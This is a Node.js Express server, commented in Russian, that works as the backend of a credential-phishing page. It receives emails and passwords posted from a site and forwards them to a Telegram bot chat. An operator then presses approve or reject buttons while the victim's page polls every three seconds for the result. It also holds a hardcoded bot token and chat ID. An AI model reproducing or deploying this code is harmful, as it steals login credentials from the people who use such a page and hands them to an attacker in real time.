const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors()); // Чтобы сайт мог делать запросы к бэкенду

const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
const chatId = '-1003894478662';

// Хранилище статусов пользователей в памяти сервера
let requests = {}; 

// 1. Прием данных с сайта
app.post('/send-data', async (req, res) => {
    try {
        const { userId, email, pass } = req.body;
        requests[userId] = 'pending';

        const message = `⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
        
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Верно", callback_data: `approve_${userId}` },
                        { text: "❌ Ошибка", callback_data: `reject_${userId}` }
                    ]
                ]
            }
        });

        res.json({ status: 'sent' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Ошибка отправки в ТГ' });
    }
});

// 2. Проверка статуса (сайт опрашивает это)
app.get('/check-status/:userId', (req, res) => {
    const status = requests[req.params.userId] || 'pending';
    res.json({ status });
});

// 3. Обработка нажатий кнопок (Webhook от Telegram)
app.post('/tg-webhook', async (req, res) => {
    try {
        const callbackQuery = req.body.callback_query;
        if (callbackQuery) {
            const data = callbackQuery.data; // Пример: "approve_user123"
            const [action, userId] = data.split('_');

            if (action === 'approve') {
                requests[userId] = 'success';
            } else if (action === 'reject') {
                requests[userId] = 'error';
            }

            // Отвечаем Телеграму, что получили нажатие
            await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                callback_query_id: callbackQuery.id,
                text: action === 'approve' ? "Пропущено дальше" : "Отказано"
            });

            // Обновляем сообщение, чтобы убрать кнопки
            await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
                chat_id: chatId,
                message_id: callbackQuery.message.message_id,
                text: callbackQuery.message.text + (action === 'approve' ? "\n\n✅ ПРИНЯТО" : "\n\n❌ ОТКЛОНЕНО")
            });
        }
    } catch (e) {
        console.error("Ошибка в Webhook:", e);
    }
    res.sendStatus(200);
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});

// Сайт вызывает это каждые 3 сек
app.get('/check-status/:userId', (req, res) => {
    res.send({ status: requests[req.params.userId] || 'pending' });
});
